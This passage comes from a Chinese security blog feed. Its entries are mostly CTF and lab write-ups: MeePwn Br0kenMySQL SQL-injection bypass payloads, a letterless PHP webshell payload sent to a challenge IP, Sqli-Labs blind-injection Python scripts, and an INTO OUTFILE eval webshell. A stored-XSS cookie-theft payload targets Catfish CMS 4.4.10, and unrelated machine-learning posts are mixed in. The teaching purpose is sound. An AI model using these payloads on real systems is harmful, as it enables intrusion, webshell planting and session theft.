5.1后有CURRENT_TIMESTAMP()CURRENT_TIMESTAMPCURTIME()localtime()localtimelocaltimestamp()localtimestampnow()sysdate()utc_timestamp() Br0kenMySQL v212345678910111213141516171819202122232425262728293031323334353637383940Br0kenMySQL&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;&lt;p style='color:Red'&gt;Br0kenMySQL&lt;/p&gt;&lt;?phpif($_GET['debug']=='🕵') die(highlight_file(__FILE__));require '../config.php';$link = mysqli_connect('localhost', MYSQL_USER, MYSQL_PASSWORD);if (!$link) &#123; die('Could not connect: ' . mysql_error());&#125;if (!mysqli_select_db($link,MYSQL_USER)) &#123; die('Could not select database: ' . mysql_error());&#125; $id = $_GET['id']; if(preg_match('#sleep|benchmark|floor|rand|count|select|from|\(|\)#is',$id)) die('Don\'t hurt me :-('); $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id); $row = mysqli_fetch_array($query); $username = $row['username']; if($username === 'guest')&#123; $ip = @$_SERVER['HTTP_X_FORWARDED_FOR']!="" ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']; if(preg_match('#sleep|benchmark|floor|rand|count|select|from|\(|\)#is',$ip)) die('Don\'t hurt me :-('); var_dump($ip); if(!empty($ip)) mysqli_query($link,"INSERT INTO logs VALUES('&#123;$ip&#125;')"); $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id); $row = mysqli_fetch_array($query); $username = $row['username']; if($username === 'admin')&#123; echo "What, again ???????!@#$!@#$!@#$\n"; die(FLAG_2); &#125; echo "Nothing here"; &#125; else &#123; echo "Hello ".$username; &#125;?&gt;&lt;/h1&gt;&lt;/pre&gt; 相比较于第一题，过滤了select，和括号（），所以需要换其他方法。类似前面，需要找到一个随机的方法，使得id的值在某些情况下为1（admin），为2（guest），并且不需要括号。比如对一个“随机”值，对其进行mod 2，得到的结果是0或1，我们只要再加上1，就能得到对应的1或2。几种payload:12341 + CURRENT_TIMESTAMP%21 + localtime%21 + localtimestamp%21 + utc_timestamp%2 当然在发送的时候要进行url编码，+替换为%2b,%替换为%25 1MeePwnCTF&#123;_I_g1ve__uPPPPPPPP&#125; Br0kenMySQL v312345678910111213141516171819202122232425262728293031323334353637383940414243444546474849Br0kenMySQL&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;&lt;p style=&apos;color:Red&apos;&gt;Br0kenMySQL&lt;/p&gt;&lt;?phpif($_GET[&apos;debug&apos;]==&apos;🕵&apos;) die(highlight_file(__FILE__));require &apos;../config.php&apos;;$link = mysqli_connect(&apos;localhost&apos;, MYSQL_USER, MYSQL_PASSWORD);if (!$link) &#123; die(&apos;Could not connect: &apos; . mysql_error());&#125;if (!mysqli_select_db($link,MYSQL_USER)) &#123; die(&apos;Could not select database: &apos; . mysql_error());&#125; $id = $_GET[&apos;id&apos;]; if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&apos;,$id)) die(&apos;Don\&apos;t hurt me :-(&apos;); $query = mysqli_query($link,&quot;SELECT username FROM users WHERE id = &quot;. $id); $row = mysqli_fetch_array($query); $username = $row[&apos;username&apos;]; if($username === &apos;guest&apos;)&#123; sleep(5); // wait $ip = @$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]!=&quot;&quot; ? $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;] : $_SERVER[&apos;REMOTE_ADDR&apos;]; if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&apos;,$ip)) die(&apos;Don\&apos;t hurt me :-(&apos;); var_dump($ip); if(!empty($ip)) mysqli_query($link,&quot;INSERT INTO logs VALUES(&apos;&#123;$ip&#125;&apos;)&quot;); $query = mysqli_query($link,&quot;SELECT username FROM users WHERE id = &quot;. $id); $row = mysqli_fetch_array($query); $username = $row[&apos;username&apos;]; if($username === &apos;admin&apos;)&#123; echo &quot;What, again ???????!@#$!@#$!@#$\n&quot;; echo &quot;Last one, promise!\n&quot;; die(FLAG_3); &#125; echo &quot;Nothing here&quot;; &#125; else &#123; echo &quot;Hello &quot;.$username; &#125;?&gt;&lt;/h1&gt;&lt;/pre&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[谈一谈php变量的内存分布]]></title>
      <url>%2F2017%2F07%2F16%2F%E8%B0%88%E4%B8%80%E8%B0%88php%E5%8F%98%E9%87%8F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83%2F</url>
      <content type="text"></content>
    </entry>

    
    <entry>
      <title><![CDATA[一道好玩的webshell题]]></title>
      <url>%2F2017%2F07%2F15%2F%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98%2F</url>
      <content type="text"><![CDATA[过滤了数字和绝大多数字符。题目给了源码：123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpini_set("display_errors", "On");error_reporting(E_ALL | E_STRICT);if(!isset($_GET['c']))&#123; show_source(__FILE__); die();&#125;function rand_string( $length ) &#123; $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; $size = strlen( $chars ); $str = ''; for( $i = 0; $i &lt; $length; $id+ ) &#123; $str .= $chars[ rand( 0, $size - 1 ) ]; &#125; return $str;&#125;$data = $_GET['c'];$black_list = array(' ', '!', '"', '#', '%', '&amp;', '*', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '&lt;', '&gt;', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\\', '^', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '|', '~');foreach ($black_list as $b) &#123; if (stripos($data, $b) !== false)&#123; die("WAF!"); &#125;&#125;$filename=rand_string(0x20).'.php';$folder='uploads/';$full_filename = $folder.$filename;if(file_put_contents($full_filename, '&lt;?php '.$data))&#123; echo "&lt;a href='".$full_filename."'&gt;WebShell&lt;/a&gt;&lt;/br&gt;"; echo "Enjoy your webshell~";&#125;else&#123; echo "Some thing wrong...";&#125; 字母啥的都过略了。参考p神的一些不包含数字和字母的webshell。其思路就是利用字符串ARRAY获取字符A，利用php的特性，从A递增获得A到Z的各个字母。原webshell存在&quot;修改其webshell，如下：1234567891011121314151617181920212223242526272829303132333435&lt;?php$_='';$_[+$_]++;$_=$_.'';$__=$_[+''];$_ = $__;$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]); 由于+在传送中会被解释为空格，所以需要提前url编码为%2b,然后还需要去掉上面的这个webshell中的空格，换行。最后的payload如下：1http://120.24.215.80:10010/?c=$_=&apos;&apos;;$_[%2b$_]%2b%2b;$_=$_.&apos;&apos;;$__=$_[%2b&apos;&apos;];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&apos;_&apos;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]); 这里另外补充一个webshell，解法来自http://www.jianshu.com/p/d23d4b1358f2：1234567891011121314151617181920212223242526&lt;?php$_=[].[];$__='';$_=$_[''];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_; // E$_=++$_;$_=++$_;$__=$_.$__; // GE$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_; // GET var_dump($&#123;'_'.$__&#125;[_]($&#123;'_'.$__&#125;[__])); // $_GET["_"]($_GET["__"]); 其最后的payload为：1http://120.24.215.80:10010/?c=%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[php代码审计小总结]]></title>
      <url>%2F2017%2F07%2F14%2Fphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93%2F</url>
      <content type="text"><![CDATA[php代码审计小总结 命令执行php代码执行 eval() assert() preg_replace + ‘/e’ call_user_func() call_user_func_arra() create_function array_map() 系统命令执行 system() passthru() exec() pcntl_exec() shell_exec() popen() proc_open() `(反单引号) ob_start() escapeshellcmd() // 该函数用于过滤 文件上传 move_uploaded_file() getimagesize() //验证文件头只要为GIF89a，就会返回真 文件删除 unlink() session_destroy() 文件包含本地文件包含 require() include() include_once() require_once() 远程文件包含 allow_url_include = on 文件读取读文件 hightlight_file($filename); show_source($filename); print_r(php_strip_whitespace($filename)); print_r(file_get_contents($filename)); readfile($filename); print_r(file($filename)); // var_dump fread(fopen($filename,”r”), $size); include($filename); // 非php代码 include_once($filename); // 非php代码 require($filename); // 非php代码 require_once($filename); // 非php代码 print_r(fread(popen(“cat flag”, “r”), $size)); print_r(fgets(fopen($filename, “r”))); // 读取一行 fpassthru(fopen($filename, “r”)); // 从当前位置一直读取到 EOF print_r(fgetcsv(fopen($filename,”r”), $size)); print_r(fgetss(fopen($filename, “r”))); // 从文件指针中读取一行并过滤掉 HTML 标记 print_r(fscanf(fopen(“flag”, “r”),”%s”)); print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组 列目录 print_r(glob(“*”)); // 列当前目录 print_r(glob(“/*”)); // 列根目录 print_r(scandir(“.”)); print_r(scandir(“/“)); $d=opendir(&quot;.&quot;);while(false!==($f=readdir($d))){echo&quot;$f\n&quot;;} $d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read())){echo$f.&quot;\n&quot;;} 超全局变量 $GLOBALS 变量覆盖 extract() import_request_variables() parse_str() mb_parse_str() 全局变量覆盖：register_globals为ON，$GLOBALS php序列化函数 serialize() unserialize() ini_set(‘session.serialize_handler’, ‘php_serialize’); Reference 代码审计入门总结 php花式读取文件函数汇总 Awesome-CTF-Book]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less7-writeup]]></title>
      <url>%2F2017%2F07%2F12%2FSqli-Labs-Less7-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less7 是 dump out file 基础知识利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。 load_file()用于读取本地文件内容。有几个条件限制： 需要有读取文件的权限 需要知道文件的绝对物理路径。 假设C盘里有一个TEST.txt文件，内容为chybeta。几种读取方式如下： 直接使用绝对路径注意对路径中斜杠的处理。 mysql&gt; select load_file(“C://TEST.txt”); mysql&gt; select load_file(“C:/TEST.txt”); mysql&gt; select load_file(“C:\TEST.txt”); 以上返回结果如下：123456+---------------------------+| load_file(&quot;C://TEST.txt&quot;) |+---------------------------+| chybeta |+---------------------------+1 row in set (0.00 sec) 但若输入以下查询则会返回空即不成功。 mysql&gt; select load_file(“C:\TEST.txt”);123456+--------------------------+| load_file(&quot;C:\TEST.txt&quot;) |+--------------------------+| NULL |+--------------------------+1 row in set (0.00 sec) 使用编码ASCII以C:\\TEST.txt为例。对其进行ascii编码后利用char（）进行查询：1mysql&gt; select load_file(char(67,58,92,92,84,69,83,84,46,116,120,116)); 返回结果：123456+---------------------------------------------------------+| load_file(char(67,58,92,92,84,69,83,84,46,116,120,116)) |+---------------------------------------------------------+| chybeta |+---------------------------------------------------------+1 row in set (0.02 sec) 十六进制以C:\\TEST.txt为例。对其进行十六进制编码后进行查询：1mysql&gt; select load_file(0x433a5c5c544553542e747874); 返回结果：123456+---------------------------------------+| load_file(0x433a5c5c544553542e747874) |+---------------------------------------+| chybeta |+---------------------------------------+1 row in set (0.00 sec) select可以用来导出文件/数据到文件中。语法如下：1SELECT * INTO OUTFILE &apos;file_name&apos; 或者1SELECT * INTO DUMPFILE &apos;file_name&apos; file_name处一般要指定绝对路径，否则就会导出到mysql的目录下。同时对需导出的目录有可写权限。对file_name，可以有以下几种编码方式，注意对路径分隔符的处理： 数据导出12mysql&gt; select database() into outfile &apos;C:\\phpstudy\\WWW\\test\\1&apos;;Query OK, 1 row affected (0.09 sec) 12mysql&gt; select database() into outfile &apos;C:/phpstudy/WWW/test/1&apos;;Query OK, 1 row affected (0.00 sec) 这里是假设写入到文件1中。在实际测试中，要outfile出的文件不能已经存在，否则会报错。12mysql&gt; select database() into outfile &apos;C:/phpstudy/WWW/test/1&apos;;ERROR 1086 (HY000): File &apos;C:/phpstudy/WWW/test/1&apos; already exists 写入webshelloutfile还可以用来写入webshell。前提是： 需要知道网站的绝对物理路径，这样导出后的webshell可访问 对需导出的目录有可写权限。 12mysql&gt; select &quot;&lt;?php eval($_POST[&apos;chybeta&apos;])?&gt;&quot; into outfile &apos;C:/phpstudy/WWW/test/webshell.php&apos;;Query OK, 1 row affected (0.00 sec) Lees 7payload:1http://localhost:20000/sqllab/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php eval($_POST[&quot;chybeta&quot;]) ?&gt;&apos; into outfile &quot;C:\\phpstudy\\WWW\\test\\less7.php&quot; %23]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less5-6-writeup]]></title>
      <url>%2F2017%2F07%2F12%2FSqli-Labs-Less5-6-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labs是用来练习sql注入的好平台。project地址：https://github.com/Audi-1/sqli-labs本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53 Less5-6是盲注 Less 5step1访问1http://localhost:20000/sqllab/Less-5/?id=1 页面正常，返回：You are in…… step21http://localhost:20000/sqllab/Less-5/?id=1&apos; 报错。之后的过程要记得闭合单引号。 step3依次访问如下链接：12http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=1 --+http://localhost:20000/sqllab/Less-5/?id=1&apos; AND 1=2 --+ 页面返回信息不同。同时试着使用UNION SELECT注入，1http://localhost:20000/sqllab/Less-5/?id=&apos; UNION SELECT 1,2,3 --+ 页面返回 You are in……返回通用页面。故考虑盲注。这里使用推断攻击技术，通过推断一次一位地逐步提取信息。注入 id=1’ AND (condition)后，通过页面返回的信息来判断condition的真假。当condition为真时，会返回包含“You are in……”的正常页面，当condition为假时，返回空页面。 Exp1Condition12Condition Example:SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1),num2,1) = char num1和num2都是整数，char为单个字符。 (SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT num1-1,1) 会返回查询到结果（即各数据库名称）的第num1行。 SUBSTRING(*,num2,1) 返回查询后结果的第num2个字母。 SUBSTRING(*,num2,1) = a 是布尔表达式，根据其真假，页面会返回不同的信息。 Something 通过类似的方法，可以先获取数据库的数量，再根据数量依次判断。 通过变化num1，num2，char，可以获取到最后的数据。 多查询一位，通过返回的最后一位是否为空格来判断当前所查询字符串是否已经结束。 Code12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requestsimport stringdataset = " abcdefghijklmnopqrstuvwxyz_"querydata = "schema_name"querydb = "INFORMATION_SCHEMA"def sendPayload(payload): url = "http://localhost:20000/sqllab/Less-5/?id=1' "+ payload content = requests.get(url).text return contentdef findDatabaseNumber(): count = 1 while count: payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =" payload = payload + str(count) + "--+" recv = sendPayload(payload) if "You are in" in recv: return count else: count += 1def getDatabaseName(dbNum): for k in range(dbNum): i = 1 result = "" while i : for j in dataset: querysql = "AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "+str(k)+",1),"+str(i)+",1)='"+j recv = sendPayload(querysql) if "You are in" in recv: if j != ' ': result += j i += 1 else: print result i = 0 breakdef exp(): dbNum = findDatabaseNumber() print "the number of database is "+str(dbNum) getDatabaseName(dbNum)exp() Result Exp2Exp1中，是基于字典进行匹配的，效率低下。可以采用二分法来进行优化。大体思路如上跟Exp1相同。 Condition12Condition Example:ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0 ,1), 1 ,1)) &gt; 127 判断当前第一行的第一个字符的asll码值是否大于127。若该条件为真，则将127替换为 191 （即 （127+255）/2），若该条件为假，则将127替换为63（即（-1+127）/2） Something在写二分法盲注时遇到了一些问题，想了一些策略，但不知道是不是最好的。如果有更好的做法，希望留言告知 搜索范围选择（-1，255），这样能包括的字符ASCII值x满足：0≤x≤255。当判断到所查询字符串结尾时，此时mysql对应的不是空格ASCII码32，而是0。假设所查询的第一个字符串长度为10，当查询到字符串尾部后（即第11个字符），下面这条语句是恒假的：12ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0 ,1), 11 ,1)) &gt; 0+ 由于采用了递归二分法。这里用全局变量findBit用来判断当前字符串是否查询结束，若findBit为1，表明已经查完可以直接break跳到下一个查询。 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import requestsimport stringimport sysquerydata = "schema_name"querydb = "INFORMATION_SCHEMA"global findBitdef sendPayload(payload): url = "http://localhost:20000/sqllab/Less-5/?id=1' "+ payload content = requests.get(url).text return contentdef findDatabaseNumber(): count = 1 while count: payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =" payload = payload + str(count) + "--+" recv = sendPayload(payload) if "You are in" in recv: return count else: count += 1def getDatabaseName(dbNum): global findBit for k in range(dbNum): i = 1 while i : findBit = 0 doubleSearch(-1,255,i,k) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakdef doubleSearch(leftNum,rightNum,i,k): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): querysql = "AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT " + str(k) + ",1)," + str(i) + ",1)) &gt; " + str(midNum) + "--+" recv = sendPayload(querysql) if "You are in" in recv: doubleSearch(midNum,rightNum,i,k) else: doubleSearch(leftNum,midNum,i,k) else: if rightNum != 0: sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): dbNum = findDatabaseNumber() print "the number of database is "+str(dbNum) getDatabaseName(dbNum)exp() Result Less 6Step1 1http://localhost:20000/sqllab/Less-6/?id=1&apos; 无报错 1http://localhost:20000/sqllab/Less-6/?id=1&quot; 页面报错，返回信息： use near ‘“1”” LIMIT 0,1’ at line 1。需要闭合双引号。 1http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=1 --+ 页面返回正常 1http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=2 --+ 返回错误页面（空白） Step2采用盲注。分析同Less5。exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import requestsimport stringimport sysquerydata = "schema_name"querydb = "INFORMATION_SCHEMA"global findBitdef sendPayload(payload): url = 'http://localhost:20000/sqllab/Less-6/?id=1" '+ payload content = requests.get(url).text return contentdef findDatabaseNumber(): count = 1 while count: payload = "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) =" payload = payload + str(count) + "--+" recv = sendPayload(payload) if "You are in" in recv: return count else: count += 1def getDatabaseName(dbNum): global findBit for k in range(dbNum): i = 1 while i : findBit = 0 doubleSearch(-1,255,i,k) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakdef doubleSearch(leftNum,rightNum,i,k): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): querysql = "AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT " + str(k) + ",1)," + str(i) + ",1)) &gt; " + str(midNum) + "--+" recv = sendPayload(querysql) if "You are in" in recv: doubleSearch(midNum,rightNum,i,k) else: doubleSearch(leftNum,midNum,i,k) else: if rightNum != 0: sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): dbNum = findDatabaseNumber() print "the number of database is "+str(dbNum) getDatabaseName(dbNum)exp()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞]]></title>
      <url>%2F2017%2F07%2F11%2FCatfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[Catfish(鲶鱼) CMS V 4.4.10 ：http://www.catfish-cms.com/ 审计在...\application\index\controller\Index.php中，定义了评论功能。代码如下；1234567891011//添加评论$data = [ 'post_id' =&gt; Request::instance()-&gt;post('id'), 'url' =&gt; 'index/Index/article/id/'.Request::instance()-&gt;post('id'), 'uid' =&gt; Session::get($this-&gt;session_prefix.'user_id'), 'to_uid' =&gt; $beipinglunren['post_author'], 'createtime' =&gt; date("Y-m-d H:i:s"), 'content' =&gt; $this-&gt;filterJs(Request::instance()-&gt;post('pinglun')), 'status' =&gt; $plzt];Db::name('comments')-&gt;insert($data); 评论内容content在经过函数filterJs过滤后插入到数据库中。 filterJs定义在...\application\index\controller\Common.php中1234protected function filterJs($str)&#123; return preg_replace(['/&lt;script[\s\S]*?&lt;\/script&gt;/i','/&lt;style[\s\S]*?&lt;\/style&gt;/i'],'',$str);&#125; 仅做了简单的过滤，只要构造下列payload就可绕过:1&lt;scr&lt;script&gt;&lt;/script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;script&gt;&lt;/script&gt;ipt&gt; filterJs会把&lt;script&gt;**&lt;/script&gt;替换为空，从而使插入到数据库中的数据变为：1&lt;script&gt;alert(document.cookie)&lt;/script&gt;替换为空 验证以普通账户user登陆，并对文章进行评论 因为Catfish CMS在前端进行了一次编码过滤，若是直接在评论区直接插入payload会被编码转换。所i抓包，将pinglun参数改为payload admin登陆后台，触发XSS： 查看源代码：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[渗透测试(1)信息搜集]]></title>
      <url>%2F2017%2F07%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%2F</url>
      <content type="text"><![CDATA[未完 域名域名注册人等whois利用whois，可以查询域名的相关详细信息。包括域名所有人，域名注册日期，联系方式，邮箱等等。在社会工程学、以及后期的渗透中起到很大的作用。 http://whois.chinaz.com/ l 子域名爆破域传送漏洞工具CDN绕过搜索引擎高级搜索技巧网络组件搜索IPC段IP同服站点特殊信息泄露 github Reference 本屌的web漏洞扫描器思路 技巧总结（域名信息收集篇） 子域名的艺术 【渗透神器系列】搜索引擎 域渗透基础简单信息收集（基础篇） 内网渗透定位技术总结 后渗透攻防的信息收集 安全攻城师系列文章－敏感信息收集 子域名枚举的艺术 论二级域名收集的各种姿势 我眼中的渗透测试信息搜集 大型目标渗透－01入侵信息搜集]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[机器学习算法：感知机(perceptron)]]></title>
      <url>%2F2017%2F07%2F08%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron%2F</url>
      <content type="text"><![CDATA[机器学习算法:感知机(perceptron) 定义学习策略造轮子原始形式1234567891011121314151617181920212223242526import matplotlib.pyplot as pltimport numpy as npf1 = plt.figure(1)data_set = np.array([[3,3,1],[4,3,1],[1,1,-1],[2,4,1],[0,0,-1],[2,0,-1],[6,1,-1]])plt.scatter(data_set[np.where(data_set[:,2] == 1)][:,0],data_set[np.where(data_set[:,2] == 1)][:,1],marker = 'x', color = 'm')plt.scatter(data_set[np.where(data_set[:,2] == -1)][:,0],data_set[np.where(data_set[:,2] == -1)][:,1],marker = 'o', color = 'g')length = len(data_set)rate = 1w = np.array([0,0])b = 0flag = Truex = np.linspace(-1,5,10)while flag == True : flag = False for i in range(length) : if ( data_set[i][2] * (w.dot(data_set[i,0:2]) + b )) &lt;= 0 : w = w + rate * data_set[i][2] * data_set[i,0:2] b = b + rate * data_set[i][2] flag = True print(w,b)plt.plot(x,(-b - w[0] * x) / w[1],'r')plt.show()print(w,b) 输出结果：12345678910111213141516171819[3 3] 1[2 2] 0[2 2] -1[0 2] -2[-6 1] -3[-3 4] -2[1 7] -1[0 6] -2[-6 5] -3[-3 8] -2[-4 7] -3[-5 6] -4[-2 9] -3[-3 8] -4[-4 7] -5[ 0 10] -4[-1 9] -5[-2 8] -6[-3 7] -7 对偶形式]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Tensorflow学习：常用API]]></title>
      <url>%2F2017%2F07%2F06%2FTensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API%2F</url>
